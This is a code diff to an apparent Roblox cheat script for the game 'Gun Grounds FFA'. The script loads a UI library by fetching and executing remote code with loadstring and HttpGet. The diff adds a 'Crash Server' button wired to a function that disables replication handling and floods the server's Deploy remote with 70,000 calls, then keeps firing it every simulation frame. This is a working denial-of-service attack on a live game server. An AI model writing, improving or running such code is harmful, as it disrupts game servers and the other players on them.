@@ -2,8 +2,20 @@ local lib = loadstring(Game:HttpGet("https://raw.githubusercontent.com/NoobHubV1
 local autoRespawn
 local Window = lib:NewWindow("Gun Grounds FFA")
 local Section = Window:NewSection("Main")
+function crashServer()
+  autoRespawn = nil; settings():FindService("NetworkSettings").IncomingReplicationLag = math.huge
+  for i = 1, 70000 do
+    game.ReplicatedStorage.Remotes.PlayerReQuests.Deploy:FireServer("Play")
+  end
+  game.RunService.PreSimulation:Connect(function()
+    game.ReplicatedStorage.Remotes.PlayerReQuests.Deploy:FireServer("Play")
+  end)
+end
 Section:CreateToggle("Auto Respawn", function(state)
   autoRespawn = state
+end)
+Section:CreateButton("Crash Server", function()
+  crashServer()
 end)
 game.Players.localPlayer.CharacterAdded:Connect(function(NewCharacter)
 	NewCharacter:WaitForChild("HumanoidRootPart")
